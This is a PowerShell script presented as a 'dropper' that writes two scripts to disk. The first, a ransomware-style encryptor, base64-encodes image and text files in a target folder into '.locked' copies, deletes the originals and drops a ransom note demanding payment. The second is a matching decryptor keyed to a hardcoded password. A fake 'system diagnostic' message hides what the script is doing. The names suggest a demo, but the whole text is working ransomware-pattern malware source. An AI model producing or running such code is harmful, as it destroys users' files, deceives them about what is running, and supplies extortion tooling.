# Stage 1: The Dropper (Silent Environment Preparation)
Write-Host "[*] Initializing system diagnostic components..." -ForegroundColor Gray

# --- 1. THE ENCRYPTOR (The Weapon) ---
$encCode = @'
$target = "C:\Users\Administrator\RansomwareTest-main"
$SecretKey = "AI-DEMO-2026"
$ransomNotePath = "$env:USERPROFILE\Desktop\READ_ME_NOW.txt"

# Encrypting files
Get-ChildItem -Path $target -Include *.jpg,*.png,*.txt -Recurse | ForEach-Object {
    $content = [System.IO.File]::ReadAllBytes($_.FullName)
    $encoded = [System.Convert]::ToBase64String($content)
    $encoded | Set-Content ($_.FullName + ".locked")
    Remove-Item $_.FullName
}

# Creating Ransom Note
$noteContent = @"
YOUR FILES HAVE BEEN ENCRYPTED. 
TO DECRYPT YOUR DATA, YOU MUST PURCHASE THE KEY.
CONTACT: ATTACKER@DARKWEB.COM
YOUR PERSONAL IDENTIFIER: $($env:COMPUTERNAME)-$(Get-Random)
"@
$noteContent | Set-Content $ransomNotePath

# Pop up the note
Start-Process notepad.exe $ransomNotePath
'@

# --- 2. THE DECRYPTOR (The Recovery Tool) ---
$decCode = @'
param([string]$Key)
$target = "C:\Users\Administrator\RansomwareTest-main"

if ($Key -eq "AI-DEMO-2026") {
    Write-Host "[+] Key Accepted. Reversing file transformations..." -ForegroundColor Green
    Get-ChildItem -Path $target -Filter *.locked -Recurse | ForEach-Object {
        $encoded = Get-Content $_.FullName
        $decoded = [System.Convert]::FromBase64String($encoded)
        $originalName = $_.FullName.Replace(".locked", "")
        [System.IO.File]::WriteAllBytes($originalName, $decoded)
        Remove-Item $_.FullName
        Write-Host "Restored: $originalName"
    }
} else {
    Write-Host "[-] Invalid Key. Access Denied." -ForegroundColor Red
}
'@

# --- 3. UNPACKING ---
# We write them to the current directory
$encCode | Set-Content .\encrypt.ps1
$decCode | Set-Content .\decrypt.ps1

Write-Host "[+] Components staged successfully." -ForegroundColor Green
